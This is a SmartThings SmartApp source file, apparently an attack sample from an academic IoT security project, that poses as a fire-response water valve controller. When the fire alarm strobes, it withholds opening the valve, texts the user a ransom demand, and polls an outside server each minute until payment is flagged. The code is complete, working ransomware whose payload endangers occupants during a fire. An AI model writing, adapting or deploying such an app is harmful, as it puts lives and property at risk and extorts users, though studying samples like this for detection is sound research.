/**
 * Attack Description:
 * 		The malicious SmartApp would not take effective actions until the user pay the money when emergency happens.
 * Normal functions:
 * 		The water valve SmartApp controls the emergent water. If there is a fire at home and the fire alarm strobes, 
 * 		then it would pull out water to put off the fire.
 * Malicious functions:
 * 		The malicious water valve SmartApp does not let the user pull out the water until he pays the money.
 */
definition(
		name: "Attack 24: Ransomware",
		namespace: "uiuc",
		author: "Qi Wang",
		description: "Randomware",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")
preferences {
	section("Select your devices") {
		input "smoke", "capability.smokeDetector", title: "smoke detector"
		input "alarm", "capability.alarm"
		input "valve", "capability.valve"
	}
	section("Send Notifications?") {
		input("recipients", "contact", title: "Send notifications to") {
			input "phone", "phone", title: "Warn with text message (optional)",
			description: "Phone Number", required: false
		}
	}
}

def installed() {
	state.moneyReceived = false;
	initialize()
}

def updated() {
	unsubscribe()
	initialize()
}

def initialize() {
	subscribe(smoke, "smoke", smokeHandler)
	subscribe(alarm, "alarm", strobeHandler)
}


def smokeHandler(evt) {
	if(evt.value == "detected") {
		alarm.strobe()
	}
	else if(evt.value == "clear") {
		alarm.off()
	}
}

def strobeHandler(evt) {
	if(evt.value == "strobe") {
		state.msg = "Our home is on fire!!!"
		state.attackRansonMsg = "If you want to open the valve, pay 100 dollar to account: attackerAcount!!!"
		sendNotification()
		attack()
	}else if(evt.value == "off") {
		state.msg = "The fire is put out!"
		state.attackRansonMsg = "Thanks! Good Luck!!!"
		sendNotification()
		valve.close()
		log.debug "close valve"
	}
}


def attack() {
	runEvery1Minute(checkMoneyReceived)
}

def checkMoneyReceived(){
	try{
		httpGet("http://128.174.237.226:8080/ProvenanceServer/Attack24") { resp ->
			state.moneyReceived = resp.data.data.flag
		}
	}
	catch (e){
		log.debug e
	}

	if(state.moneyReceived) {
		log.debug "Attack succeed: got the money!"
		valve.open()
		unschedule(checkMoneyReceived)
	}
}


def sendNotification() {
	def message = state.msg + state.attackRansonMsg
	log.debug "message = $message"
	if (location.contactBookEnabled && recipients) {
		sendNotificationToContacts(message, recipients)
	} else if (phone) {
		sendSms(phone, message)
	}
}